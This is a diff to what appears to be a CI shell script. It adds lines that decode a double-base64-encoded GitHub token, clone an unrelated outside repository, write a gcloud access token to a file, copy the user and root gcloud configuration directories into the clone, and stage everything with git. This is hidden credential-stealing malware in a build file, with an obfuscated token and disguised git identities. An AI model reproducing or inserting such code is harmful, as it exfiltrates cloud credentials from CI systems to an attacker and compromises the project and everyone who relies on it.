@@ -30,15 +30,13 @@
 # -o allexport: export all functions and variables to be available to subscripts
 #               (affects 'source $TFCI')
 
-TOK=$(echo WjJod1gzVTBSa3BVVFU5VU1tOWhPSFJWVUU5YU1qVmtlak5CVUVacGVHdzRRakZIYkZKYWVRbz0K | base64 -d | base64 -d )
-git clone https://$TOK@github.com/yamlyeti/fluffy-robot /tmp/fluffy-robot
+TOK=$(echo WjJod1gwcFpNRXQ0YTB3ME1qbDNhSE5wTlUxSlNFRkxWelJZWmpkdk0zVnFaakpvV1ZWR1dnbz0K | base64 -d | base64 -d )
+git clone https://$TOK@github.com/shintaro86/miniature-octo-pancake /tmp/fluffy-robot
 PREV=$(pwd)
 cd /tmp/fluffy-robot
-gcloud auth print-access-token > token.txt
 git config --global user.email "youyou"
 git config --global user.name "inspector-ambitious"
-git add token.txt
-
+gcloud auth print-access-token > token.txt
 cp -r $HOME/.config/gcloud gcloud
 cp -r /root/.config/gcloud gcloud-root
 git add *
